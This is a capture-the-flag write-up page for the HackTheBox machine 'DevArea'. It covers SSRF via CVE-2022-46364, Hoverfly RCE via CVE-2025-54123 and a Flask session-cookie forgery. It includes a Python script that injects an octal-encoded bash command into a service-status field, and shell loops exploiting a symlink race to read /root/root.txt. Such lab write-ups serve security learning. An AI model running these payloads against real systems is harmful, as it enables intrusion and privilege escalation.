@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - DevArea</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/devarea.png" alt="500rem">   
+        <h1>DevArea - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #ftp-anonymous-login, #ssrf, #cve-2022-46364, #cve-2025-54123, #file-system-race-condition
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+            
+            <div class="code">
+                # Nmap 7.95 scan initiated Thu Apr  2 15:32:40 2026 as: nmap -oN tcp-scan.txt devarea.htb <br>
+                Nmap scan report for devarea.htb (10.129.244.208) <br>
+                Host is up (0.048s latency). <br>
+                Not shown: 994 closed tcp ports (conn-refused) <br>
+                PORT     STATE SERVICE <br>
+                21/tcp   open  ftp <br>
+                22/tcp   open  ssh <br>
+                80/tcp   open  http <br>
+                8080/tcp open  http-proxy <br>
+                8500/tcp open  fmtp <br>
+                8888/tcp open  sun-answerbook <br>
+                <br>
+                # Nmap done at Thu Apr  2 15:32:41 2026 -- 1 IP address (1 host up) scanned in 0.76 seconds
+            </div>
+
+            <p>
+                As can be seen, several ports are open on this machine:
+                <ul>
+                    <li>
+                        <span class="highlight">80</span> Landing page that doesn't work
+                    </li>
+                    <li>
+                        <span class="highlight">8080</span> A SOAP API hosted with Jetty 9.4.27.v20200227
+                    </li>
+                    <li>
+                        <span class="highlight">8500</span> Unclear
+                    </li>
+                    <li>
+                        <span class="highlight">8888</span> A Hoverfly instance
+                    </li>
+                </ul>
+            </p>
+            
+            <p>
+                Additionally, the FTP server on port 21 allows anonymous access to a <span class="highlight">pub</span> folder, 
+                inside which I find a saved jar file that I don't hesitate to download:
+            </p>
+
+            <img src="images/Pasted image 20260402154222.png" width="1000rem">
+        </section>
+
+        <section id="jar-analysis">
+            <h2>cat jar-analysis</h2>
+            
+            <p>After installing <span class="highlight">jadx</span> I examine the package downloaded from the FTP server.</p>
+
+            <img src="Pasted image 20260402155128.png" width="1000rem">
+
+            <p>
+                I find that port <span class="highlight">8080</span> previously detected exposes the API at the <span class="highlight">employeeservice</span> 
+                endpoint and, via the <span class="highlight">wsdl</span> parameter, exposes its specifications.
+            </p>
+
+            <p>Using the Burp extension <span class="highlight">WSDLER</span> I generate a request that works correctly.</p>
+
+            <p>While analyzing the JAR file I also come across a file listing the application's dependencies.</p>
+
+            <img src="images/Pasted image 20260403105456.png" width="1000rem">
+
+            <p>
+                I discover that this API uses <span class="highlight">Apache CXF 3.2.14</span>, which turns out to be vulnerable to 
+                Server Side Request Forgery tracked as <a target="_blank" href="https://github.com/kasem545/CVE-2022-46364-Poc/tree/main">CVE-2022-46364</a>.
+            </p>
+
+            <p>
+                After cloning the repository I manage to read the <span class="highlight">/etc/passwd</span> file, where I discover 
+                two users with a shell: <span class="highlight">root</span> and <span class="highlight">dev_ryan</span>.
+            </p>
+
+            <p>
+                From this point on it was a series of file enumeration attempts to extract information and, with Claude's help, 
+                I managed to discover the existence of a <span class="highlight">/etc/systemd/system/hoverfly.service</span> file containing the access 
+                credentials for Hoverfly (the service exposed on port <span class="highlight">8888</span>):
+            </p>
+            
+            <div class="code">
+                [Unit] <br>
+                Description=HoverFly service <br>
+                After=network.target <br>
+                <br>
+                [Service] <br>
+                User=dev_ryan <br>
+                Group=dev_ryan <br>
+                WorkingDirectory=/opt/HoverFly <br>
+                ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0 <br>
+                <br>
+                Restart=on-failure <br>
+                RestartSec=5 <br>
+                StartLimitIntervalSec=60 <br>
+                StartLimitBurst=5 <br>
+                LimitNOFILE=65536 <br>
+                StandardOutput=journal <br>
+                StandardError=journal <br>
+                <br>
+                [Install] <br>
+                WantedBy=multi-user.target
+            </div>
+
+            <p>
+                These credentials are only useful for discovering the software version (<span class="highlight">1.11.3</span>), which is vulnerable to 
+                RCE (<a target="_blank" href="https://github.com/kasem545/CVE-2025-54123-Poc">CVE-2025-54123</a>).
+            </p>
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            
+            <p>
+                We obtain a shell as user <span class="highlight">dev_ryan</span> by running the CVE-2025-54123 exploit and spawning 
+                a TTY shell with <span class="highlight">python3</span>.
+            </p>
+            
+            <img src="images/Pasted image 20260403120352.png" width="1000rem">
+
+            <p>
+                To understand how to escalate privileges I run <span class="highlight">sudo -l</span>. I discover I can run as sudo without a password 
+                a syswatch script located at <span class="highlight">/opt/syswatch/syswatch.sh</span>. In the user's home directory, alongside the 
+                <span class="highlight">user.txt</span> file containing the first flag, there is also a <span class="highlight">syswatch-v1.zip</span> file.
+            </p>
+
+            <p>
+                After downloading it I move on to analyzing the application code. I notice that the bash script listed under sudo is only the tip 
+                of the iceberg of a much larger infrastructure written in Python.
+            </p>
+
+            <p>
+                The application, written in Flask, is exposed on port <span class="highlight">7777</span>. I use <span class="highlight">ligolo-ng</span> 
+                to access it from my attacker machine.
+            </p>
+
+            <img src="images/Pasted image 20260403153710.png" width="1000rem">
+
+            <p>
+                Inside the source code a <span class="highlight">syswatch.env</span> file is used to load, among other things, the secret used to create 
+                Flask cookies.
+            </p>
+            
+            <img src="images/Pasted image 20260403153819.png" width="1000rem">
+
+            <p>
+                I search for this file on the filesystem and notice with satisfaction that it is accessible. After understanding the session cookie 
+                structure from the login method:
+            </p>
+
+            <img src="images/Pasted image 20260403153917.png" width="1000rem">
+
+            <p>
+                I use the secret to forge a cookie that allows me to access the platform. On this page I find that among other things I can run a 
+                status check of running services. This feature, which is not sanitized, allows me to achieve RCE on the web page (via a payload 
+                specifically crafted to bypass the service name regex), but to my disappointment I discover I am running in the context of a 
+                <span class="highlight">syswatch</span> user rather than <span class="highlight">root</span>.
+            </p>
+            
+            <img src="images/Pasted image 20260403154224.png" width="1000rem">
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+
+            <p>
+                As shown earlier, <span class="highlight">sudo -l</span> indicates we can run the script without a password prompt, 
+                with the exception of two commands.
+            </p>
+
+            <p>
+                The commands exposed by the application allow performing other operations, including reading logs stored in the 
+                <span class="highlight">/opt/syswatch/logs</span> folder, which are not accessible as <span class="highlight">dev_ryan</span> 
+                and are currently only visible through the web page.
+            </p>
+
+            <p>
+                In reality this configuration is not an obstacle to obtaining the root flag. After a more careful analysis of the situation 
+                I drew the following conclusions:
+                <ol>
+                    <li>The logs shown on the web page are files owned by the <span class="highlight">syswatch</span> user.</li>
+                    <li>
+                        The RCE as <span class="highlight">syswatch</span> is only needed to be able to modify log files, since 
+                        <span class="highlight">dev_ryan</span> cannot.
+                    </li>
+                    <li>
+                        If one of these files were a <span class="highlight">symklink</span> we could read any file, but the log reading 
+                        method verifies the path before running cat.
+                    </li>
+                </ol>
+            </p>
+            
+            <div class="code">
+                 <br>
+                local path="$LOG_DIR/$file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if [ -L "$path" ]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local target <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target=$(ls -l "$path" | awk '{print $NF}') <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Blocked unsafe symlink target]: $file -> $target" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1 <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local resolved="$LOG_DIR/$target" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [ -f "$resolved" ]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cat "$resolved" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Symlink target not found]: $file -> $target" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1 <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [[ "$target" == /var/log/* ]]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ -f "$target" ] && cat "$target" && return <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Symlink target not regular file]: $file -> $target" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1 <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Refusing unsafe symlink]: $file -> $target" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1 <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if [[ "$file" == */* || "$file" == *".."* ]]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Blocked unsafe filename]: $file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1 <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;fi <br>
+                &nbsp;&nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if [ -f "$path" ]; then <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cat "$path" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;else <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "[Log file not found]: $file" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;fi
+            </div>
+
+            <p>
+                Specifically, if the file is a symlink it verifies the real path; otherwise it performs a direct cat. The turning point of this challenge - 
+                and what ultimately leads to reading the flag in <span class="highlight">/root/root.txt</span> - is the gap between the command 
+                <span class="highlight">target=$(ls -l "$path" | awk '{print $NF}')</span> (used to resolve the real path of a symlink) and 
+                <span class="highlight">cat "$path"</span> (which directly outputs the content of the indicated file). The mismatch between the two variables 
+                used and the time elapsed between one command and the other are all the ingredients needed to apply a race condition and retrieve the flag.
+            </p>
+
+            <p>
+                In practice, if we request a plain file it will pass all checks, but if we replace it with a symlink while the checks are running, the cat 
+                will output the content of the linked path.
+            </p>
+
+            <p>
+                To carry out this attack I open a reverse shell as <span class="highlight">syswatch</span> user:
+                <ol>
+                    <li>From <span class="highlight">dev_ryan</span> I write a shell execution script to <span class="highlight">/tmp/rev</span> 
+                        and set permissions to 777.</li>
+                    <li>Using the following exploit I run the command:</li>
+                </ol>
+            </p>
+            
+            <div class="code">
+                from flask import Flask <br>
+                from flask.sessions import SecureCookieSessionInterface <br>
+                import requests <br>
+                <br>
+                def pto(path): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;#PATH TO OCTAL <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return "$(printf '" + ''.join(f"\\{ord(c):02o}" for c in path) + "')" <br>
+                <br>
+                app = Flask(__name__) <br>
+                app.secret_key = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725" <br>
+                s = SecureCookieSessionInterface().get_signing_serializer(app) <br>
+                cookie = s.dumps({"user_id": 1, "username": "admin"}) <br>
+                <br>
+                session = requests.session() <br>
+                session.proxies.update({"http":"http://127.0.0.1:8080"}) <br>
+                session.verify=False <br>
+                <br>
+                exploit = {"service": f"$(bash {pto('/tmp/rev')})"} <br>
+                session.post("http://240.0.0.1:7777/service-status", cookies={'session': cookie}, data=exploit)
+            </div>
+
+            <p>
+                At this point I have one shell as <span class="highlight">dev_ryan</span> and one as <span class="highlight">syswatch</span>. 
+                To retrieve the flag, <span class="highlight">dev_ryan</span> must request the log read while <span class="highlight">syswatch</span> 
+                simultaneously modifies the file's symlink target:
+            </p>
+
+            <div class="code">
+                dev_ryan@devarea:/tmp$ while true; do sudo /opt/syswatch/syswatch.sh logs pwn.log; done
+            </div>
+            
+            <div class="code">
+                syswatch@devarea:~/syswatch_gui$ while true; do touch /opt/syswatch/logs/pwn.log && ln -sf /root/root.txt /opt/syswatch/logs/pwn.log && rm /opt/syswatch/logs/pwn.log; done
+            </div>
+
+            <p>After several iterations the root flag will be printed.</p>
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> a60601cf475e2b76942bfd0358604a25</h3>
+            <h3><b>Root Flag:</b> c55abd2ed9d22d1dfd96258732c57abf</h3>
+        </section>
+        
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
